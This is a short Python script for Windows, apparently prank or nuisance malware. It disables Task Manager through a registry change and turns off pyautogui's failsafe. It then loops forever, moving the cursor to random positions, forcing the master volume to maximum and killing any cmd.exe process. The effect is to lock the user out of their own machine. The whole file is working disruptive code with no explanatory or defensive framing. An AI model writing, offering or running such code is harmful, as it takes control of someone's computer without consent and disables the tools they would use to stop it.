import os
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import pyautogui as ui
import random
ui.FAILSAFE = False
devices = AudioUtilities.GetSpeakers()
interface = devices.Activate(
    IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
volume = cast(interface, POINTER(IAudioEndpointVolume))
mute = volume.GetMute()
vl = volume.GetMasterVolumeLevel()
vr = volume.GetVolumeRange()
os.system('REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f')
class shubiao:
    def move(self,a,b):
        ui.moveTo(random.randint(a,b), random.randint(a,b),duration=0)
S=shubiao()        
while True:
    S.move(0,1000)
    volume.SetMasterVolumeLevel(0.0, None)
    os.system('taskkill /f /im cmd.exe')
    
    
    
